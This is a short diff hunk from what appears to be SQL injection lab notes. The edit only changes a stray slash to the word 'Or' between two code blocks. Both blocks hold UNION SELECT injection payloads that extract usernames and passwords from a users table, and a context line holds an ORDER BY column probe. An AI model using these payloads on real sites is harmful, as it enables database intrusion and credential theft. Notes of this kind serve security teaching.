@@ -104,7 +104,7 @@ order by 3--
 ```sh
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ```
-/
+Or
 
 ```sh
 '+UNION+SELECT+NULL,username||password+FROM+users--
